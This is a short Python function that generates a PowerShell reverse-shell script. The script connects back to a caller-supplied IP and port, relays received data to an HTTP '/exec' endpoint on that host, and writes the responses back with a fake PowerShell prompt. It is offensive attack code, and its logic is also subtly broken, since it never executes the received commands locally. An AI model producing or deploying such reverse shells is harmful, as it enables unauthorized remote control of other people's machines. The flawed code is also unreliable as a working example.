def generate_reverse_shell(remote_ip, port):
    shell_code = f"""
$client = New-Object System.Net.Sockets.TCPClient("{remote_ip}", {port});
$stream = $client.GetStream();
[Byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (Invoke-WebRequest -Uri "http://{remote_ip}:{port}/exec" -Method POST -Body $data).Content;
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
    $sendbyte = [Text.Encoding]::ASCII.GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
"""
    return shell_code.strip()
